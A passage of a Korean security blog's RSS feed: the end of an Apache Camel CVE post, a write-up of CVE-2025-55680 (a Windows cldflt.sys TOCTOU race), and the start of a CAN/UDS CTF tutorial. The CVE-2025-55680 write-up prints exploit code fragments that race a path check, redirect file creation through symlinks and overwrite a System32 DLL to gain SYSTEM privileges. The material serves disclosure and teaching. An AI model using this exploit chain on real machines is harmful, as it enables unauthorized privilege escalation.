&#xD544;&#xD130; &#xC870;&#xAC74;&#xACFC; &#xC77C;&#xCE58;&#xD558;&#xBBC0;&#xB85C; &#xCC28;&#xB2E8;&#xB429;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/akamai/CVE-2025-27636-Apache-Camel-PoC">https://github.com/akamai/CVE-2025-27636-Apache-Camel-PoC</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/clalxk/">clalxk</category>
      
      <category domain="https://hackyboiz.github.io/tags/Apache-Software-Foundation/">Apache Software Foundation</category>
      
      <category domain="https://hackyboiz.github.io/tags/Apache-Camel/">Apache Camel</category>
      
      <category domain="https://hackyboiz.github.io/tags/Case-Sensitive-Header-Filtering-Bypass/">Case-Sensitive Header Filtering Bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-27636/">CVE-2025-27636</category>
      
      
      <comments>https://hackyboiz.github.io/2025/11/26/clalxk/CVE-2025-27636/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-55680: Windows Cloud Files 미니필터 드라이버(cldflt.sys)의 TOCTOU 레이스 컨디션을 통한 LPE 취약점</title>
      <link>https://hackyboiz.github.io/2025/11/22/banda/CVE-2025-55680/</link>
      <guid>https://hackyboiz.github.io/2025/11/22/banda/CVE-2025-55680/</guid>
      <pubDate>Sat, 22 Nov 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://ssd-disclosure.com/cloud-filter-arbitrary-f</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://ssd-disclosure.com/cloud-filter-arbitrary-file-creation-eop-patch-bypass-lpe">https://ssd-disclosure.com/cloud-filter-arbitrary-file-creation-eop-patch-bypass-lpe</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>2025&#xB144; 10&#xC6D4; 14&#xC77C;&#xC790; Microsoft &#xC815;&#xAE30; &#xBCF4;&#xC548; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xC801;&#xC6A9; &#xC774;&#xC804;&#xC758; Windows 10/11 &#xD658;&#xACBD;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2025-55680&#xC740; &#xC6D0;&#xB798; 2020&#xB144; Microsoft&#xAC00; &#xD328;&#xCE58;&#xD588;&#xB358; Arbitrary File Creation EoP &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD574;&#xC11C;, TOCTOU &#xB808;&#xC774;&#xC2A4; &#xC870;&#xAC74;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xC6B0;&#xD68C; &#xACF5;&#xACA9;&#xC774; &#xB2E4;&#xC2DC; &#xAC00;&#xB2A5;&#xD574;&#xC9C4; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; Windows Cloud Files Mini Filter Driver&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3><pre><code class="hljs cpp"><span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )      {        v23 = *(_WORD *)((<span class="hljs-keyword">char</span> *)v52 + <span class="hljs-number">2</span> * v22 + epi16);        <span class="hljs-keyword">if</span> ( v23 == <span class="hljs-string">&apos;\\&apos;</span> || v23 == <span class="hljs-string">&apos;:&apos;</span> )          <span class="hljs-keyword">break</span>;        <span class="hljs-keyword">if</span> ( ++v22 &gt;= (<span class="hljs-keyword">unsigned</span> __int16)(WORD1(v18) &gt;&gt; <span class="hljs-number">1</span>) )          <span class="hljs-keyword">goto</span> LABEL_51;      }</code></pre><p>&#xAE30;&#xC874;&#xC758; &#xAC80;&#xC0AC; &#xCF54;&#xB4DC;&#xB294; &#xACBD;&#xB85C;&#xC5D0; <code>\</code>&#xD639;&#xC740; <code>:</code>&#xBB38;&#xC790;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xB294;&#xC9C0; &#xAC80;&#xC0AC;&#xD558;&#xACE0;, &#xACBD;&#xB85C;&#xC5D0; &#xD574;&#xB2F9; &#xBB38;&#xC790;&#xAC00; &#xC788;&#xC73C;&#xBA74; &#xD30C;&#xC77C; &#xC0DD;&#xC131;&#xC774; &#xCC28;&#xB2E8;&#xB418;&#xB294; &#xD750;&#xB984;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">ProbeForRead(a4, Length, <span class="hljs-number">4u</span>);  MmProbeAndLockPages(MemoryDescriptorList, <span class="hljs-number">1</span>, IoReadAccess);  <span class="hljs-keyword">if</span> ( (MemoryDescriptorList-&gt;MdlFlags &amp; <span class="hljs-number">5</span>) != <span class="hljs-number">0</span> )    MappedSystemVa = (<span class="hljs-keyword">char</span> *)MemoryDescriptorList-&gt;MappedSystemVa;  <span class="hljs-keyword">else</span>    MappedSystemVa = (<span class="hljs-keyword">char</span> *)MmMapLockedPagesSpecifyCache(MemoryDescriptorList, <span class="hljs-number">0</span>, MmCached, <span class="hljs-number">0</span>i64, <span class="hljs-number">0</span>, <span class="hljs-number">0x40000010</span>u);  v46 = MappedSystemVa;</code></pre><p><code>ProbeForRead</code>&#xC640; <code>MmProbeAndLockPages</code>&#xB85C; &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xB77D;(lock)&#xD55C; &#xD6C4; &#xBB38;&#xC790;&#xC5F4; &#xAC80;&#xC0AC;&#xB97C; &#xC218;&#xD589;&#xD558;&#xACE0; &#xC788;&#xC9C0;&#xB9CC;, &#xC774;&#xB294; &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xACE0;&#xC815;&#xD560; &#xBFD0; &#xB0B4;&#xC6A9; &#xC790;&#xCCB4;&#xB97C; &#xB3D9;&#xACB0;&#xC2DC;&#xD0A4;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xD574;&#xB2F9; &#xBC84;&#xD37C;&#xB294; &#xC5EC;&#xC804;&#xD788; UserMode&#xC5D0;&#xC11C;&#xB3C4; &#xC4F0;&#xAE30;&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xACE0;, &#xCEE4;&#xB110;&#xC774; &#xBB38;&#xC790;&#xC5F4; &#xAC80;&#xC0AC;&#xB97C; &#xC218;&#xD589;&#xD55C; &#xC9C1;&#xD6C4;&#xB098; &#xAC80;&#xC99D;&#xACFC; &#xC2E4;&#xC81C; &#xC0AC;&#xC6A9; &#xC0AC;&#xC774; &#xD0C0;&#xC774;&#xBC0D;&#xC5D0; &#xAC12;&#xC774; &#xBC14;&#xB014; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C;&#xBB38;&#xC5D0; &#xAC80;&#xC0AC; &#xC2DC;&#xC810;&#xC5D0;&#xB294; &#xC815;&#xC0C1;&#xC73C;&#xB85C; &#xBCF4;&#xC600;&#xB358; &#xACBD;&#xB85C;&#xAC00; &#xC0AC;&#xC6A9; &#xC2DC;&#xC810;&#xC5D0;&#xB294; &#xB2E4;&#xB978; &#xAC12;&#xC73C;&#xB85C; &#xBC14;&#xB00C;&#xB294; TOCTOU &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><pre><code class="hljs cpp">DoStartSvc();_mkdir(<span class="hljs-string">&quot;C:\\ProgramData\\cldpwn&quot;</span>);_mkdir(<span class="hljs-string">&quot;C:\\ProgramData\\cldpwn\\boo&quot;</span>);HRESULT hr = CfRegisterSyncRoot(dir, &amp;reg, &amp;policies, CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT);init_symlink();</code></pre><p>&#xBA3C;&#xC800; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC5D0; &#xC0AC;&#xC6A9;&#xD560; &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xD544;&#xD130; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xAC00; &#xB85C;&#xB4DC;&#xB418;&#xB3C4;&#xB85D; &#xAD00;&#xB828; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC2DC;&#xC791;&#xD55C; &#xB4A4;, &#xACF5;&#xACA9;&#xC5D0; &#xC0AC;&#xC6A9;&#xD560; &#xC784;&#xC758;&#xC758; &#xACBD;&#xB85C;(<code>C:\ProgramData\cldpwn</code> &#xBC0F; &#xADF8; &#xD558;&#xC704; &#xB514;&#xB809;&#xD1A0;&#xB9AC;)&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xC774; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB97C; Windows Cloud Filter Sync Root&#xB85C; &#xB4F1;&#xB85D;&#xD574;, &#xD574;&#xB2F9; &#xACBD;&#xB85C; &#xC544;&#xB798;&#xC758; &#xD30C;&#xC77C; &#xC0DD;&#xC131; &#xC694;&#xCCAD;&#xC774; &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xD544;&#xD130; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xBC18;&#xB4DC;&#xC2DC; &#xAC70;&#xCE58;&#xB3C4;&#xB85D; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;. (<a href="https://hackyboiz.github.io/2025/08/15/banda/Minifilter-Driver/ko/">&#xD544;&#xD130; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC640; Sync Root</a> &#x1F448;)</p><pre><code class="hljs cpp"><span class="hljs-keyword">wchar_t</span> path[] = <span class="hljs-string">L&quot;boo16.txt&quot;</span>;createthread test = (createthread)GetProcAddress(LoadLibraryA(<span class="hljs-string">&quot;ntdll.dll&quot;</span>), <span class="hljs-string">&quot;RtlCreateUserThread&quot;</span>);HANDLE a;<span class="hljs-keyword">char</span> buffer11[<span class="hljs-number">0x100</span>];*(WORD*)(tmp + <span class="hljs-number">0x8</span>) = <span class="hljs-number">0x100</span>;*(WORD*)(tmp + <span class="hljs-number">0xa</span>) = (lstrlenW(path)) * <span class="hljs-number">2</span>;*(WORD*)(tmp + <span class="hljs-number">0xc</span>) = <span class="hljs-number">0x20</span>;*(WORD*)(tmp + <span class="hljs-number">0xe</span>) = <span class="hljs-number">0x30</span>;<span class="hljs-built_in">memcpy</span>(tmp + <span class="hljs-number">0x100</span>, path, (lstrlenW(path) + <span class="hljs-number">1</span>) * <span class="hljs-number">2</span>);    ...*(<span class="hljs-keyword">int</span>*)inbuffer = <span class="hljs-number">0x9000001A</span>;*(<span class="hljs-keyword">int</span>*)(inbuffer + <span class="hljs-number">4</span>) = <span class="hljs-number">0xC0000001</span>;*(<span class="hljs-keyword">int</span>*)(inbuffer + <span class="hljs-number">8</span>) = <span class="hljs-number">0x1</span>;*(<span class="hljs-keyword">int</span>*)(inbuffer + <span class="hljs-number">16</span>) = <span class="hljs-number">0x200</span>;*(<span class="hljs-keyword">char</span>**)(inbuffer + <span class="hljs-number">24</span>) = tmp;<span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {        *(<span class="hljs-keyword">char</span>*)(tmp + <span class="hljs-number">0x106</span>) = <span class="hljs-number">0x31</span>;        *(<span class="hljs-keyword">char</span>*)(tmp + <span class="hljs-number">0x11a</span>) = <span class="hljs-number">0x31</span>;        DeviceIoControl(dir_handle, <span class="hljs-number">0x903BC</span>, inbuffer, <span class="hljs-number">0x98</span>, outbuffer, <span class="hljs-number">0x1000</span>, &amp;BytesReturned, <span class="hljs-number">0</span>);    }</code></pre><p>&#xC774;&#xD6C4; <code>dir_handle</code>&#xC5D0; &#xB300;&#xD574; IOCTL(<code>0x903BC</code>)&#xC744; &#xBC18;&#xBCF5;&#xC801;&#xC73C;&#xB85C; &#xBCF4;&#xB0B4;&#xBA74;&#xC11C;, <code>boo16.txt</code>&#xB77C;&#xB294; &#xC774;&#xB984;&#xC758; placeholder &#xD30C;&#xC77C;&#xC744; &#xACC4;&#xC18D; &#xC0DD;&#xC131;&#xD558;&#xB3C4;&#xB85D; &#xC2DC;&#xB3C4;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; <code>inbuffer</code>&#xC758; &#xCCAB; &#xD544;&#xB4DC; <code>0x9000001A</code>&#xC640; &#xC0C1;&#xD0DC; &#xCF54;&#xB4DC; <code>0xC0000001</code>, <code>0xC0000007</code>&#xC740; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xD544;&#xD130; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xC11C; <code>HsmpOpCreatePlaceholders</code>&#xB85C; &#xB9E4;&#xD551;&#xB418;&#xB294; &#xC694;&#xCCAD; &#xD0C0;&#xC785;&#xACFC; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; &#xD574;&#xC11D;&#xB429;&#xB2C8;&#xB2E4;. &#xC989;, &#xC774; &#xB8E8;&#xD504;&#xB97C; &#xD1B5;&#xD574; <code>C:\ProgramData\cldpwn</code> &#xC544;&#xB798;&#xC5D0;&#xC11C; placdholder &#xC0DD;&#xC131; &#xC694;&#xCCAD;&#xC744; &#xD3ED;&#xBC1C;&#xC801;&#xC73C;&#xB85C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0A4;&#xB294; &#xD2B8;&#xB9AC;&#xAC70; &#xC5ED;&#xD560;&#xC744; &#xD558;&#xBA74;&#xC11C; &#xC774; &#xC2DC;&#xC810;&#xC758; &#xC785;&#xB825; &#xBC84;&#xD37C; <code>tmp</code>&#xAC00; &#xC774;&#xD6C4; TOCTOU &#xB808;&#xC774;&#xC2A4;&#xC758; &#xD0C0;&#xAC9F;&#xC774; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">thread1</span><span class="hljs-params">()</span> </span>{  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {    Sleep(<span class="hljs-number">5</span>);    *(<span class="hljs-keyword">char</span> *)(tmp + <span class="hljs-number">0x106</span>) = <span class="hljs-number">0x5c</span>;  }}</code></pre><p>&#xACC4;&#xC18D; <code>boo16.txt</code>&#xC5D0; &#xB300;&#xD574; placeholder &#xD30C;&#xC77C; &#xC0DD;&#xC131; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4;&#xB294; &#xB3D9;&#xC548;, <code>thread1()</code>&#xC5D0;&#xC11C;&#xB294; &#xB3D9;&#xC77C; &#xBC84;&#xD37C; <code>tmp</code>&#xB97C; &#xD2B9;&#xC815; &#xBC14;&#xC774;&#xD2B8;&#xB97C; <code>0x31(&apos;1&apos;)</code>&#xC5D0;&#xC11C; <code>0x5c(&apos;\\&apos;)</code>&#xB85C; &#xB36E;&#xC5B4; &#xACBD;&#xB85C; &#xBB38;&#xC790;&#xC5F4; &#xC77C;&#xBD80;&#xB97C; &#xC21C;&#xAC04;&#xC801;&#xC73C;&#xB85C; <code>boo\\6.txt</code> &#xD615;&#xD0DC;&#xAC00; &#xB418;&#xB3C4;&#xB85D; &#xC870;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. &#xACBD;&#xB85C; &#xAC80;&#xC0AC; &#xB8E8;&#xD2F4;&#xC740; &#xC815;&#xC0C1;&#xC801;&#xC778; &#xAC12;&#xC77C; &#xB54C; &#xC548;&#xC804;&#xD55C; <code>boo16.txt</code> &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xD1B5;&#xACFC;&#xD558;&#xC9C0;&#xB9CC;, &#xAC80;&#xC0AC; &#xC9C1;&#xD6C4; thread1()&#xC774; &#xD574;&#xB2F9; &#xBC14;&#xC774;&#xD2B8;&#xB97C; <code>\</code>&#xB85C; &#xBC14;&#xAFD4; &#xB193;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xCEE4;&#xB110;&#xC774; &#xC77C;&#xC2DC;&#xC801;&#xC73C;&#xB85C; <code>boo\6.txt</code> &#xD615;&#xD0DC;&#xAC00; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function">BOOL <span class="hljs-title">CreateJunction</span><span class="hljs-params">(LPCWSTR dir, LPCWSTR target)</span> </span>{  HANDLE hJunction;  DWORD cb;  <span class="hljs-keyword">wchar_t</span> printname[] = L <span class="hljs-string">&quot;&quot;</span>;  HANDLE hDir;  hDir = CreateFile(dir, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, <span class="hljs-literal">NULL</span>);...  <span class="hljs-keyword">if</span> (DeviceIoControl(hDir, FSCTL_SET_REPARSE_POINT, Data, Totalsize, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp; cb, <span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span>) {    <span class="hljs-built_in">free</span>(Data);    <span class="hljs-keyword">return</span> TRUE;...}<span class="hljs-function">BOOL <span class="hljs-title">DosDeviceSymLink</span><span class="hljs-params">(LPCWSTR object, LPCWSTR target)</span> </span>{  <span class="hljs-keyword">if</span> (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH, object, target)) {    <span class="hljs-keyword">return</span> TRUE;...}</code></pre><p>&#xD55C;&#xD3B8; <code>CreateJunction()</code>&#xACFC; <code>DosDeviceSymLink()</code>&#xB97C; &#xD1B5;&#xD574; &#xACBD;&#xB85C; &#xD574;&#xC11D; &#xCCB4;&#xC778;&#xC744; &#xAD6C;&#xC131;&#xD574;&#xB461;&#xB2C8;&#xB2E4;. &#xBA3C;&#xC800; <code>C:\ProgramData\cldpwn\boo\</code> &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; NTFS junction&#xC73C;&#xB85C; &#xB9CC;&#xB4E4;&#xC5B4; NT &#xB124;&#xC784;&#xC2A4;&#xD398;&#xC774;&#xC2A4; &#xC0C1;  <code>\RPC Control</code>&#xC5D0; &#xC5F0;&#xACB0;&#xD558;&#xB3C4;&#xB85D; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xC5B4;&#xC11C; <code>GLOBAL\GLOBALROOT\RPC\Control\6.txt</code>&#xB97C; <code>\??\C:\Windows\System32\rasmxs.dll</code>&#xB85C; &#xD5A5;&#xD558;&#xB294; DOS &#xB514;&#xBC14;&#xC774;&#xC2A4; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB85C; &#xB4F1;&#xB85D;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xACB0;&#xACFC; &#xCEE4;&#xB110;&#xC774; &#xBCF4;&#xB294; &#xCD5C;&#xC885; &#xACBD;&#xB85C; &#xD750;&#xB984;&#xC740; <code>C:\ProgramData\cldpwn\boo\6.txt</code> &#x2192; <code>\RPC Control\6.txt</code> &#x2192; <code>C:\Windows\System32\rasmxs.dll</code>&#xAC00; &#xB418;&#xBA74;&#xC11C; &#xD574;&#xB2F9; &#xACBD;&#xB85C;&#xC5D0; &#xB300;&#xD574; &#xC4F0;&#xAE30; &#xAC00;&#xB2A5;&#xD55C; &#xD30C;&#xC77C; &#xD578;&#xB4E4;&#xC744; &#xC5F4;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">CreateFile(<span class="hljs-string">L&quot;C:\\Windows\\System32\\rasmxs.dll&quot;</span>, GENERIC_WRITE,...);WriteFile(handle, buffer, bytesRead, ...);trigger_loadlibrary(<span class="hljs-number">1</span>);</code></pre><p>&#xC774; &#xD578;&#xB4E4;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC900;&#xBE44;&#xD55C; &#xC545;&#xC131; DLL &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; <code>WriteFile()</code>&#xB85C; &#xC2DC;&#xC2A4;&#xD15C; &#xACBD;&#xB85C;&#xC758; <code>rasmxs.dll</code>&#xC5D0; &#xADF8;&#xB300;&#xB85C; &#xB36E;&#xC5B4;&#xC501;&#xB2C8;&#xB2E4;. &#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; <code>trigger_loadlibrary(1)</code>&#xC774; <code>rasman.dll</code> &#xB0B4;&#xBD80; &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; rasman &#xC11C;&#xBE44;&#xC2A4;&#xC640;&#xC758; RPC &#xD638;&#xCD9C;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xACE0;, &#xC11C;&#xBE44;&#xC2A4; &#xCABD;&#xC5D0;&#xC11C; &#xD3C9;&#xC18C; &#xB3D9;&#xC791;&#xB300;&#xB85C; <code>C:\Windows\System32\rasmxs.dll</code>&#xC744; &#xB85C;&#xB4DC;&#xD558;&#xB3C4;&#xB85D; &#xD2B8;&#xB9AC;&#xAC70;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; DLL &#xB0B4;&#xC6A9;&#xC740; &#xACF5;&#xACA9;&#xC790; &#xCF54;&#xB4DC;&#xB85C; &#xAD50;&#xCCB4;&#xB418;&#xC5B4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xC218;&#xC815;&#xB41C; <code>rasmxs.dll</code>&#xC774; rasmans &#xC11C;&#xBE44;&#xC2A4; SYSTEM &#xAD8C;&#xD55C; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C; &#xB85C;&#xB4DC;&#xB418;&#xACE0; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xBA70; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-55680">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-55680</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/banda/">banda</category>
      
      <category domain="https://hackyboiz.github.io/tags/Windows/">Windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/CLDFLT/">CLDFLT</category>
      
      <category domain="https://hackyboiz.github.io/tags/TOCTOU/">TOCTOU</category>
      
      <category domain="https://hackyboiz.github.io/tags/Minifilter/">Minifilter</category>
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      
      <comments>https://hackyboiz.github.io/2025/11/22/banda/CVE-2025-55680/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Understanding CAN / UDS Vulnerabilities through BlockHarbor CTF and CVEs (EN)</title>
      <link>https://hackyboiz.github.io/2025/11/20/newp1ayer48/can/en/</link>
      <guid>https://hackyboiz.github.io/2025/11/20/newp1ayer48/can/en/</guid>
      <pubDate>Thu, 20 Nov 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;Hello! I am newp1ayer48 from Hackyboiz, responsible for the low-level area! &amp;#x1F938;&amp;#x1F3FB;&amp;#x200D;&amp;#x2642;&amp;#xFE0F;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;i</description>
        
      
      
      
      <content:encoded><![CDATA[<p>Hello! I am newp1ayer48 from Hackyboiz, responsible for the low-level area! &#x1F938;&#x1F3FB;&#x200D;&#x2642;&#xFE0F;</p><p><img src="image01.jpg" alt="image01.jpg"></p><p>In the automotive field, a communication protocol that is frequently used and applied is CAN communication. Security vulnerabilities can also occur in this CAN communication! Many CTFs and competitions are also being held targeting the automotive sector (Defcon also has a Car Hacking Village).</p><p>In this article, we&#x2019;ll solve a problem from the BlockHarbor CTF, one of the most famous CTFs for vehicle hacking, to learn about vehicle communication and the resulting security vulnerabilities!</p><h2 id="1-CAN-Bus-amp-UDS"><a href="#1-CAN-Bus-amp-UDS" class="headerlink" title="1. CAN Bus &amp; UDS"></a>1. CAN Bus &amp; UDS</h2><p><img src="image02.png" alt="[image02.png](https://t-shaped-person.tistory.com/51)"></p><p>CAN (Controller Area Network) communication is a protocol developed for communication between devices within a vehicle, such as ECUs (Electronic Control Units). It uses a message-based, low-level network communication system in a non-host bus manner. Since it was developed in 1983, it predates the HTTP protocol! A basic CAN message consists of 8 Bytes, and the extended version, CAN-FD (Flexible Data-rate), can represent data up to 64 Bytes.</p><p>Furthermore, the international standard for CAN communication is specified by ISO 15765.</p><p><img src="image03.png" alt="[image03.png](https://swisskyrepo.github.io/HardwareAllTheThings/protocols/can/)"></p><p>UDS stands for Unified Diagnostic Services, and you&#x2019;ll frequently encounter this term when dealing with vehicle CTFs and CAN communication. It is a protocol used for diagnostic communication, primarily employed with ECUs. Since it is a higher-level protocol than the low-level CAN protocol, it allows for various functions such as data Read/Write (R/W).</p><p>The international standard for the UDS message structure operating over CAN communication was designated by ISO 15765.</p><p>Since knowing the UDS message structure is crucial for the BlockHarbor CTF challenge we are about to solve, let&#x2019;s briefly look at it. The UDS message is structured as shown in the picture above. A simple explanation of each part is as follows:</p><ul><li>CAN ID: The ECU that will transmit or receive the message.</li><li>PCI (Protocol Control Information): Primarily used for the length of the UDS message, Flow Control, etc.</li><li>SID (Service Identifier): Identifies the requested service.<ul><li>Sub Function Byte: Detailed options for the SID.</li></ul></li><li>DID (Data Identifier): Identifies the data being accessed.</li></ul><p>Now, I will explain some of the more important items among these.</p><p><img src="image04.png" alt="image04.png"></p><p>The CAN ID values for each ECU are set as hexadecimal values according to ISO 15765-4.</p><ul><li><code>7DF</code> is primarily the identifier used for broadcasting to all ECUs or for internal functions/settings to be delivered to an ECU.</li><li>For transmission, the CAN IDs are designated as <code>7E0</code> for ECU 1, <code>7E1</code> for ECU 2, and so on.</li><li>For reception, the ID is designated as the transmission value <code>+ 0x8</code>.</li></ul><p>The SID (Service Identifier) can simply be described as the identifier that signals what action (service) will be performed. Since the SID values are also standardized, you can directly check the SID value corresponding to a service through the <a href="https://en.wikipedia.org/wiki/Unified_Diagnostic_Services">document</a>. The corresponding Response SID (RSID) value is the request SID value <code>+ 0x40</code>. If the RSID, which is the response to the requested SID, is successfully received, it indicates that the communication was successful.</p><p>Additionally, there are commands among the SIDs that include a Sub Function Byte. This is used to designate a more detailed service request when an SID is requested. It is optional and may or may not be used, which can be confirmed by checking the documentation.</p><p>The DID (Data Identifier) is the identifier that refers to the data. Many DID values are also reserved according to the ISO-14229 standard, so you can check the <a href="https://piembsystech.com/data-identifiers-did-of-uds-protocol-iso-14229/">document</a> to find the appropriate DID value. The most representative example of a DID is the VIN (Vehicle Identification Number) value, which is <code>F190</code>. If you request this DID value along with an SID, the service corresponding to the SID will be executed targeting the VIN.</p><p>In the case of SIDs that use the Sub Function Byte, which we just explained, there are instances where a DID may not be necessary.</p><p>When solving the upcoming BlockHarbor CTF problems, it is absolutely essential to keep the <a href="https://en.wikipedia.org/wiki/Unified_Diagnostic_Services">SID</a> and <a href="https://piembsystech.com/data-identifiers-did-of-uds-protocol-iso-14229/">DID</a> documentation pages open and look up the commands as you go!</p><h3 id="1-1-CAN-Utils"><a href="#1-1-CAN-Utils" class="headerlink" title="1.1. CAN Utils"></a>1.1. CAN Utils</h3><p><img src="image05.jpg" alt="image05.jpg"></p><p>To transmit and receive CAN/UDS messages, you can use the can-utils tool. This tool is based on SocketCAN, which implements the CAN protocol on Linux. I&#x2019;ll explain this using the example shown below.</p><pre><code class="hljs bash">candump -a vcan0,7E0:7FF</code></pre><p><code>candump</code> is a tool that allows you to receive CAN/UDS messages. By specifying the desired CAN network interface, you can receive CAN messages from that interface. In the example above , the <code>-a</code> option was added to show the ASCII results along with the CAN message, and masking arguments <code>7E0</code> and <code>7FF</code> were added to receive data only from ECU 1.</p><p>When solving the CTF problems later, this command will be frequently used on one terminal to run and check the responses.</p><pre><code class="hljs bash">cansend vcan0 7DF<span class="hljs-comment">#0322F190 &amp;&amp; cansend vcan0 7E0#30000000</span></code></pre><p><code>cansend</code> is a tool that allows you to transmit CAN/UDS messages. Similarly, it can send a CAN message to the desired CAN network interface. For the upcoming problems, you will need to construct the message by properly configuring the SID and DID according to the UDS format explained earlier and then transmit it.</p><p>Additionally, for cases where the response data is larger than the basic CAN message length of 8 Bytes, a commonly used technique is to send a Flow Control request, such as <code>30000000</code>, along with the message to ensure all data is received.</p><p>By using <code>cansend</code> to transmit a message and then confirming the response data with <code>candump</code>, you can verify the entire CAN/UDS communication process.</p><h2 